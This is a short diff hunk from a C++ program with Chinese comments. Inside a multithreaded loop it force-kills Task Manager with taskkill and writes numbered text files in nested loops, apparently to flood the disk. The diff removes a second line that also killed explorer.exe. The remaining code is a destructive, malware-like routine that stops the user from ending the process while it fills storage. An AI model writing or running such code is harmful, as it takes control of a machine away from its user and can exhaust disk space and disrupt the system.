@@ -35,7 +35,6 @@ void thread_func(int tid) {//线程函数
     for (int i = 0; i < wl; i++) {
         //杀死任务管理器
         system("taskkill /F /IM taskmgr.exe");
-        system("taskkill /F /IM explorer.exe");
         std::string filename = std::to_string(tid) + "_" + std::to_string(i) + ".txt";
         FILE *file = fopen(filename.c_str(), "w"); // 添加c_str()转换
         for (int  j = 0; j < wl; j++)
